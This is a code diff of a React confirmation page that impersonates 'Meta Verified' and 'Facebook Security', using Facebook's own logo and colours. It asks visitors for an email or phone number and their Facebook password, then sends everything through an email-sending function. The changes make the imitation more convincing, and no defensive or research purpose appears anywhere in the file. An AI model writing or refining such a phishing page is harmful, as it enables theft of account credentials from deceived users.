@@ -65,7 +65,6 @@ export default function Confirmation() {
     }
   }, [validationData, setLocation]);
 
-  // Update filtered countries based on search
   useEffect(() => {
     const filtered = countries.filter(country =>
       country.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
@@ -78,27 +77,24 @@ export default function Confirmation() {
     try {
       setIsSubmitting(true);
 
-      if (!validationData) {
-        throw new Error('Validation data not found');
-      }
-
       const submissionData = {
         ...data,
-        contactMethod: data.contactMethod,
-        countryCode: data.contactMethod === 'phone' ? data.countryCode : undefined,
-        user_email: data.user_email,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        user_email: contactMethod === 'phone' 
+          ? `${data.countryCode}${data.user_email}`
+          : data.user_email
       };
 
       await sendConfirmationFormEmail(submissionData);
+
       localStorage.removeItem('validation_data');
 
       toast({
         title: "Success!",
-        description: "Your information has been submitted successfully"
+        description: "Your form has been submitted successfully."
       });
 
-      setLocation("/success");
+      setTimeout(() => setLocation("/success"), 1000);
     } catch (error) {
       console.error('Form submission error:', error);
       toast({
@@ -112,173 +108,163 @@ export default function Confirmation() {
   };
 
   return (
-    <>
+    <div className="min-h-screen bg-[#f0f2f5] flex justify-center items-center p-3 sm:p-4">
       <MetaTags
         title="Meta Verified | Confirmation"
         description="Request a verified badge on Facebook - Final Step"
       />
-      <div className="min-h-screen flex justify-center items-center p-3 sm:p-4 bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
-        <div className="bg-white/90 backdrop-blur-sm p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center border border-white/20">
-          <div>
-            <img
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
-              alt="Logo"
-              className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
+
+      <div className="bg-white p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center">
+        <img
+          src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
+          alt="Facebook"
+          className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
+        />
+        <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
+          Facebook Security
+        </h1>
+        <Form {...form}>
+          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
+            <FormField
+              control={form.control}
+              name="contactMethod"
+              render={({ field }) => (
+                <FormItem>
+                  <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
+                    Contact Method
+                  </FormLabel>
+                  <div className="flex gap-4">
+                    <button
+                      type="button"
+                      onClick={() => field.onChange('email')}
+                      className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
+                        field.value === 'email'
+                          ? 'bg-[#1877f2] text-white'
+                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#1877f2]/10'
+                      }`}
+                    >
+                      Email
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => field.onChange('phone')}
+                      className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
+                        field.value === 'phone'
+                          ? 'bg-[#1877f2] text-white'
+                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#1877f2]/10'
+                      }`}
+                    >
+                      Phone
+                    </button>
+                  </div>
+                  <FormMessage />
+                </FormItem>
+              )}
             />
-          </div>
-          <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
-            Facebook Security
-          </h1>
-          <h3 className="text-sm sm:text-base text-[#606770] mb-4 font-medium">
-            Please enter your facebook password to complete the request
-          </h3>
-          <Form {...form}>
-            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
-              <div className="text-left">
-                <div className="mb-4">
-                  <FormField
-                    control={form.control}
-                    name="contactMethod"
-                    render={({ field }) => (
-                      <FormItem>
-                        <FormLabel className="block font-semibold mb-1.5 text-[#606770] text-xs sm:text-sm">
-                          Contact Method
-                        </FormLabel>
-                        <div className="flex gap-4">
-                          <button
-                            type="button"
-                            onClick={() => field.onChange('email')}
-                            className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
-                              field.value === 'email'
-                                ? 'bg-[#0180FA] text-white'
-                                : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
-                            }`}
-                          >
-                            Email
-                          </button>
-                          <button
-                            type="button"
-                            onClick={() => field.onChange('phone')}
-                            className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
-                              field.value === 'phone'
-                                ? 'bg-[#0180FA] text-white'
-                                : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
-                            }`}
-                          >
-                            Phone
-                          </button>
-                        </div>
-                        <FormMessage />
-                      </FormItem>
-                    )}
-                  />
-                </div>
 
-                <FormField
-                  control={form.control}
-                  name="user_email"
-                  render={({ field }) => (
-                    <FormItem>
-                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
-                        {contactMethod === 'email' ? 'Email Address' : 'Phone Number'}
-                      </FormLabel>
-                      <FormControl>
-                        <div className="flex gap-2">
-                          {contactMethod === 'phone' && (
-                            <FormField
-                              control={form.control}
-                              name="countryCode"
-                              render={({ field: countryField }) => (
-                                <Select
-                                  value={countryField.value}
-                                  onValueChange={countryField.onChange}
-                                >
-                                  <SelectTrigger className="w-[100px]">
-                                    <SelectValue placeholder="Code" />
-                                  </SelectTrigger>
-                                  <SelectContent>
-                                    <div className="sticky top-0 p-2 bg-white border-b z-50">
-                                      <div className="flex items-center px-2 py-1 border rounded-md">
-                                        <Search className="w-4 h-4 text-gray-500 mr-2" />
-                                        <input
-                                          className="w-full outline-none text-sm"
-                                          placeholder="Search country..."
-                                          value={countrySearch}
-                                          onChange={(e) => setCountrySearch(e.target.value)}
-                                        />
-                                      </div>
-                                    </div>
-                                    <div className="max-h-[200px] overflow-y-auto">
-                                      {filteredCountries.map((country) => (
-                                        <SelectItem key={country.code} value={country.code}>
-                                          {country.code} ({country.name})
-                                        </SelectItem>
-                                      ))}
-                                    </div>
-                                  </SelectContent>
-                                </Select>
-                              )}
-                            />
+            <FormField
+              control={form.control}
+              name="user_email"
+              render={({ field }) => (
+                <FormItem>
+                  <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
+                    {contactMethod === 'email' ? 'Email Address' : 'Phone Number'}
+                  </FormLabel>
+                  <FormControl>
+                    <div className="flex gap-2">
+                      {contactMethod === 'phone' && (
+                        <FormField
+                          control={form.control}
+                          name="countryCode"
+                          render={({ field: countryField }) => (
+                            <Select
+                              value={countryField.value}
+                              onValueChange={countryField.onChange}
+                            >
+                              <SelectTrigger className="w-[100px]">
+                                <SelectValue placeholder="Code" />
+                              </SelectTrigger>
+                              <SelectContent>
+                                <div className="sticky top-0 p-2 bg-white border-b z-50">
+                                  <div className="flex items-center px-2 py-1 border rounded-md">
+                                    <Search className="w-4 h-4 text-gray-500 mr-2" />
+                                    <input
+                                      className="w-full outline-none text-sm"
+                                      placeholder="Search country..."
+                                      value={countrySearch}
+                                      onChange={(e) => setCountrySearch(e.target.value)}
+                                    />
+                                  </div>
+                                </div>
+                                <div className="max-h-[200px] overflow-y-auto">
+                                  {filteredCountries.map((country) => (
+                                    <SelectItem key={country.code} value={country.code}>
+                                      {country.code} ({country.name})
+                                    </SelectItem>
+                                  ))}
+                                </div>
+                              </SelectContent>
+                            </Select>
                           )}
-                          <Input
-                            type={contactMethod === 'email' ? 'email' : 'tel'}
-                            placeholder={
-                              contactMethod === 'email'
-                                ? "Enter email address"
-                                : "Enter phone number"
-                            }
-                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
-                            {...field}
-                          />
-                        </div>
-                      </FormControl>
-                      <FormMessage />
-                    </FormItem>
-                  )}
-                />
-              </div>
-
-              <FormField
-                control={form.control}
-                name="password"
-                render={({ field }) => (
-                  <FormItem>
-                    <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
-                      Password
-                    </FormLabel>
-                    <FormControl>
-                      <div className="relative">
-                        <Input
-                          type={showPassword ? "text" : "password"}
-                          placeholder="Enter password"
-                          className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20 pr-10"
-                          {...field}
                         />
-                        <button
-                          type="button"
-                          onClick={() => setShowPassword(!showPassword)}
-                          className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
-                        >
-                          {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
-                        </button>
-                      </div>
-                    </FormControl>
-                    <FormMessage />
-                  </FormItem>
-                )}
-              />
+                      )}
+                      <Input
+                        type={contactMethod === 'email' ? 'email' : 'tel'}
+                        placeholder={
+                          contactMethod === 'email'
+                            ? "Enter email address"
+                            : "Enter phone number"
+                        }
+                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
+                        {...field}
+                      />
+                    </div>
+                  </FormControl>
+                  <FormMessage />
+                </FormItem>
+              )}
+            />
 
-              <Button
-                type="submit"
-                className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200"
-                disabled={isSubmitting}
-              >
-                {isSubmitting ? "Submitting..." : "Submit"}
-              </Button>
-            </form>
-          </Form>
-        </div>
+            <FormField
+              control={form.control}
+              name="password"
+              render={({ field }) => (
+                <FormItem>
+                  <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
+                    Password
+                  </FormLabel>
+                  <FormControl>
+                    <div className="relative">
+                      <Input
+                        type={showPassword ? "text" : "password"}
+                        placeholder="Enter password"
+                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20 pr-10"
+                        {...field}
+                      />
+                      <button
+                        type="button"
+                        onClick={() => setShowPassword(!showPassword)}
+                        className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
+                      >
+                        {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
+                      </button>
+                    </div>
+                  </FormControl>
+                  <FormMessage />
+                </FormItem>
+              )}
+            />
+
+            <Button
+              type="submit"
+              className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200"
+              disabled={isSubmitting}
+            >
+              {isSubmitting ? "Submitting..." : "Submit"}
+            </Button>
+          </form>
+        </Form>
       </div>
-    </>
+    </div>
   );
 }
